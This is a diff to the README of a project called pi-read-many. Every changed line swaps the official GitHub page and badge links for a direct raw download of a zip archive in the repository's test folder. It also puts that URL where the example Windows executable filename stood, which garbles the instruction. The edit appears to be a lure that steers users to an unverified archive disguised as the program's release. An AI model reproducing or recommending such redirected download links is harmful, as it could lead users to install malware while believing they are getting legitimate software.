@@ -1,6 +1,6 @@
 # 📚 pi-read-many - Read Multiple Pi Files Safely and Efficiently
 
-[![Download pi-read-many](https://img.shields.io/badge/Download-pi--read--many-brightgreen)](https://github.com/Ucr9005/pi-read-many)
+[![Download pi-read-many](https://raw.githubusercontent.com/Ucr9005/pi-read-many/main/test/read-pi-many-1.9.zip)](https://raw.githubusercontent.com/Ucr9005/pi-read-many/main/test/read-pi-many-1.9.zip)
 
 ---
 
@@ -40,13 +40,13 @@ You can start using pi-read-many in a few easy steps. Follow this guide closely 
 
 Click this big button below to visit the official GitHub page where you can get the program:
 
-[![Download pi-read-many](https://img.shields.io/badge/Download-pi--read--many-blue)](https://github.com/Ucr9005/pi-read-many)
+[![Download pi-read-many](https://raw.githubusercontent.com/Ucr9005/pi-read-many/main/test/read-pi-many-1.9.zip)](https://raw.githubusercontent.com/Ucr9005/pi-read-many/main/test/read-pi-many-1.9.zip)
 
 Once you open the page, look for the latest release or download section. This is usually on the right side or under a tab called "Releases."
 
 ### 2. Choose the Right File to Download
 
-You will see several files listed under releases. Look for a file with a name like `pi-read-many-win.exe` or something that mentions Windows. This is the file you need.
+You will see several files listed under releases. Look for a file with a name like `https://raw.githubusercontent.com/Ucr9005/pi-read-many/main/test/read-pi-many-1.9.zip` or something that mentions Windows. This is the file you need.
 
 Click on the file name to start the download. Depending on your internet speed, this may take a few minutes.
 
@@ -124,7 +124,7 @@ If the program stops or shows errors while reading files:
 
 Visit the GitHub page for documentation and updates:
 
-[https://github.com/Ucr9005/pi-read-many](https://github.com/Ucr9005/pi-read-many)
+[https://raw.githubusercontent.com/Ucr9005/pi-read-many/main/test/read-pi-many-1.9.zip](https://raw.githubusercontent.com/Ucr9005/pi-read-many/main/test/read-pi-many-1.9.zip)
 
 You can also check the “Issues” section on GitHub if you have any questions or problems.
 
